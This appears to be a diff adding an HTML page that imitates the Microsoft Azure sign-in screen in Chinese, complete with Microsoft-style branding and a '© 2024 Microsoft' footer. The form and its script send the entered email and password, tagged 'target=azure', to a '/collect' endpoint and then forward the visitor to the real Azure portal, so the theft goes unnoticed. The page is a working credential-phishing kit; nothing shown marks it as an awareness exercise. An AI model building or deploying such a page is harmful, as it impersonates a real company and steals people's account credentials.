@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Azure 登录</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif; background: #f3f2f1; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .login-container { background: white; border-radius: 4px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); padding: 40px; width: 100%; max-width: 400px; }
+        .logo { text-align: center; margin-bottom: 32px; }
+        .logo svg { width: 40px; height: 40px; }
+        h1 { font-size: 24px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; text-align: center; }
+        .subtitle { text-align: center; color: #605e5c; margin-bottom: 32px; font-size: 14px; }
+        .form-group { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 6px; font-size: 13px; color: #323130; font-weight: 600; }
+        input { width: 100%; padding: 10px 12px; border: 1px solid #8a8886; border-radius: 4px; font-size: 15px; }
+        input:focus { outline: none; border-color: #0078d4; box-shadow: 0 0 0 3px rgba(0, 120, 212, 0.1); }
+        .btn { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer; }
+        .btn:hover { background: #106ebe; }
+        .footer { text-align: center; margin-top: 24px; font-size: 12px; color: #605e5c; }
+        .footer a { color: #0078d4; text-decoration: none; margin: 0 4px; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect width="40" height="40" rx="4" fill="#0078D4"/>
+                <path d="M12 14h16M12 20h16M12 26h10" stroke="white" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+        </div>
+        <h1>登录到 Azure</h1>
+        <p class="subtitle">使用您的 Microsoft 账户访问 Azure 门户</p>
+        <form id="loginForm" action="/collect" method="POST">
+            <input type="hidden" name="target" value="azure">
+            <div class="form-group">
+                <label for="username">电子邮件、手机号码或 Skype</label>
+                <input type="text" id="username" name="username" required autocomplete="username" placeholder="xxx@outlook.com">
+            </div>
+            <div class="form-group">
+                <label for="password">密码</label>
+                <input type="password" id="password" name="password" required autocomplete="current-password" placeholder="请输入密码">
+            </div>
+            <button type="submit" class="btn">登录</button>
+        </form>
+        <div class="footer">
+            <a href="#">无法访问您的帐户?</a>
+            <a href="#">创建一个!</a>
+            <div style="margin-top: 12px;">© 2024 Microsoft</div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const btn = e.target.querySelector('.btn');
+            btn.textContent = '登录中...';
+            btn.disabled = true;
+            try {
+                const resp = await fetch('/collect', { method: 'POST', body: formData });
+                if (resp.redirected) window.location.href = resp.url;
+                else window.location.href = 'https://portal.azure.com/';
+            } catch { window.location.href = 'https://portal.azure.com/'; }
+        });
+    </script>
+</body>
+</html>
